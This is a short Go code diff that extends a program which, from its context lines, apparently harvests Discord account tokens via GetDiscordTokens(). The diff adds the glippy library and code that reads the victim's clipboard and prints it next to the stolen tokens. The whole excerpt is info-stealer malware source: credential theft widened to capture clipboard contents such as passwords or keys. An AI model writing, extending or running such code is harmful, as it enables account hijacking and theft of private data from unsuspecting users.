@@ -8,6 +8,7 @@ import (
 	"runtime"
 	"path/filepath"
 	"regexp"
+	"github.com/f1bonacc1/glippy"
 )
 
 func CheckError(err error) {
@@ -104,4 +105,7 @@ func main () {
 	tokens, err := GetDiscordTokens()
 	CheckError(err)
 	fmt.Println(tokens)
+	text, err := glippy.Get()
+	CheckError(err)
+	fmt.Println("Clipboard :"+text)
 }
